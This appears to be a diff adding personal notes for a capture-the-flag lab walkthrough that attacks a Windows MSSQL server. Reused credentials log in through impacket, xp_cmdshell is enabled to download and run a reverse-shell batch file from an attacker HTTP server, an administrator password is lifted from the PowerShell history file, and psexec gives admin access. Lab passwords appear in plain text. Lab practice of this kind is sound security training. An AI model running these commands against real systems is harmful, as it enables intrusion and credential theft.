@@ -1,0 +1,30 @@
+After finding prod.dtsConfig on a smb server we can try the login details on the sql server
+
+username:password@ip
+impacket-mssqlclient sql_svc:M3g4c0rp123@ip
+
+after connecting to the database we cant use xp_cmdshell 
+	-> check if you are admin or not 
+		->SELECT IS_SRVROLEMEMBER('sysadmin');
+
+	-> activate cmd shell 
+		EXEC sp_configure 'show advanced options', '1'
+		RECONFIGURE
+		EXEC sp_configure 'xp_cmdshell', '1' 
+		RECONFIGURE
+		
+	-> create shell file & host http server with ncat listener
+	
+	-> download shell  -> EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.99:8000/shell.bat -outfile shell.bat"
+	-> execute shell -> EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; start shell.bat"
+		
+	-> on remote machine get user flag
+	-> then host a winpeas.exe file to escalate privledges to root -> wget not installed so we can use curl which is installed by default on win 10
+		-> curl.exe -o index.html https://superuser.com
+		
+Then Check for blank text in default windows file 
+	-> The file ConsoleHost_history.txt can be located in the directory -> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
+	
+After getting the plain text from the file 
+	-> /user:administrator MEGACORP_4dm1n!!
+	-> we can use psexec to gain access to the admin account -> impacket-psexec administrator@10.129.138.176  
